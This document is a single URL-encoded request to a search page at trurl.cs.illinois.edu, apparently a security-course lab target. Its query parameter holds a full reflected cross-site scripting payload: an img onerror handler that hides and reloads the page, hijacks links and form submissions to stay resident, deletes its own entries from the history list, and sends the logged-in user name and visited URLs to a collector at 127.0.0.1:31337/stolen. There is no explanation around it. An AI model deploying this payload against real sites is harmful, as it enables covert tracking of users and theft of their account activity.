http://trurl.cs.illinois.edu/search?xssdefense=2&q=%3Cimg%20src%3Dexploit%3F%20onerror%3D%27function%20payload(attacker)%20%7B%0A%09window.onpopstate%20%3D%20function(event)%20%7B%0A%09%09%2F%2Fproxy(document.location%2C%20%22%22%2C%20%22%22%2C%20%22%22)%3B%0A%09%7D%3B%0A%09function%20log(data)%20%7B%0A%09%09console.log(%24.param(data))%0A%09%09%24.get(attacker%2C%20data)%3B%0A%09%7D%0A%09function%20proxy(href%2C%20method%2C%20event_tag%2C%20historyOld)%20%7B%0A%09%09if(%24(%22%23logged-in-user%22).length%20%3E%200)%0A%09%09%7B%0A%09%09%09var%20user%20%3D%20%24(%22%23logged-in-user%22).html()%3B%0A%09%09%7D%0A%09%09%24(%22html%22).load(href%2C%20method%2C%20function()%7B%0A%09%09%09if(%24(%22%23history-list%22).length%20%3E%200)%0A%09%09%09%7B%0A%09%09%09%09%24(%22a%22).each(function()%20%7B%0A%09%09%09%09%09if(%24(this).attr(%22class%22)%20%3D%3D%20%22history-item%20list-group-item%22)%0A%09%09%09%09%09%7B%0A%09%09%09%09%09%09if(%24(this).attr(%22href%22).includes(%22payload%22))%0A%09%09%09%09%09%09%7B%0A%09%09%09%09%09%09%09%24(this).remove()%3B%0A%09%09%09%09%09%09%7D%0A%09%09%09%09%09%7D%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%24(%22html%22).show()%3B%0A%09%09%09if(event_tag%20%3D%3D%20%22.%2Flogout%22)%0A%09%09%09%7B%0A%09%09%09%09log(%7Bevent%3A%20event_tag%2C%20user%3A%20user%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%0A%09%09%09else%20if(user%20!%3D%20null)%0A%09%09%09%7B%0A%09%09%09%09log(%7Bevent%3A%20event_tag%2C%20user%3A%20user%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%0A%09%09%09else%0A%09%09%09%7B%0A%09%09%09%09log(%7Bevent%3A%20event_tag%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%0A%09%09%09%24(document).ready(function()%20%7B%0A%09%09%09%09var%20historyObj%3B%0A%09%09%09%09if(event_tag%20%3D%3D%20%22nav%22)%0A%09%09%09%09%7B%0A%09%09%09%09%09var%20searchObj%20%3D%20%7B%20search%3A%20%22search%22%20%7D%3B%0A%09%09%09%09%09history.replaceState(searchObj%2C%20%22%22%2C%20href)%3B%0A%09%09%09%09%09historyObj%20%3D%20%7B%20foo%3A%20href%20%7D%3B%0A%09%09%09%09%09history.pushState(historyOld%2C%20%22%22%2C%20href)%3B%0A%09%09%09%09%7D%0A%09%09%09%09else%0A%09%09%09%09%7B%0A%09%09%09%09%09var%20searchObj%20%3D%20%7B%20search%3A%20%22search%22%20%7D%3B%0A%09%09%09%09%09history.replaceState(searchObj%2C%20%22%22%2C%20%22http%3A%2F%2Ftrurl.cs.illinois.edu%22)%3B%0A%09%09%09%09%09historyObj%20%3D%20%7B%20foo%3A%20%22http%3A%2F%2Ftrurl.cs.illinois.edu%22%20%7D%3B%0A%09%09%09%09%09history.pushState(historyOld%2C%20%22%22%2C%20%22http%3A%2F%2Ftrurl.cs.illinois.edu%22)%3B%0A%09%09%09%09%7D%0A%09%09%09%09%24(%22a%22).each(function()%20%7B%0A%09%09%09%09%09var%20href%20%3D%20%24(this).attr(%22href%22)%3B%0A%09%09%09%09%09%24(this).bind(%22click%22%2C%20function%20()%20%7Bproxy(href%2C%20%22%22%2C%20%22nav%22)%3B%20return%20false%3B%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%09%24(%22form%22).each(function()%20%7B%0A%09%09%09%09%09%24(this).on(%22submit%22%2C%20function(e)%20%7B%0A%09%09%09%09%09%09e.preventDefault()%3B%0A%09%09%09%09%09%09var%20data%20%3D%20%24(this).serializeArray().reduce(function(key%2C%20value)%20%7B%20%0A%09%09%09%09%09%09%09key%5Bvalue.name%5D%20%3D%20value.value%3B%0A%09%09%09%09%09%09%09return%20key%3B%0A%09%09%09%09%09%7D%2C%20%7B%7D)%3B%0A%09%09%09%09%09%09var%20action%20%3D%20%24(this).attr(%22action%22)%3B%0A%09%09%09%09%09%09var%20request_params%20%3D%20%24(this).serialize()%3B%0A%09%09%09%09%09%09if(%24(this).attr(%22method%22)%20%3D%3D%20%22post%22)%0A%09%09%09%09%09%09%7B%0A%09%09%09%09%09%09%09proxy(%22%22%2Baction%2B%22%3F%22%2Brequest_params%2C%20data%2C%20action%2C%20historyObj)%3B%0A%09%09%09%09%09%09%7D%0A%09%09%09%09%09%09else%20if(%24(this).attr(%22method%22)%20%3D%3D%20%22get%22)%0A%09%09%09%09%09%09%7B%0A%09%09%09%09%09%09%09proxy(%22%22%20%2B%20action%20%2B%22%3F%22%2B%20request_params%2C%20%22%22%2C%20%22nav%22%2C%20historyObj)%3B%0A%09%09%09%09%09%09%7D%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D)%3B%0A%09%09%7D)%3B%0A%09%7D%0A%09%24(%22html%22).hide()%3B%0A%09proxy(%22.%2F%22%2C%20%22%22)%3B%0A%09var%20searchObj%20%3D%20%7B%20search%3A%20%22search%22%20%7D%3B%0A%09history.replaceState(searchObj%2C%20%22%22%2C%20%22http%3A%2F%2Ftrurl.cs.illinois.edu%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%27%3E%3C%2Fimg%3E
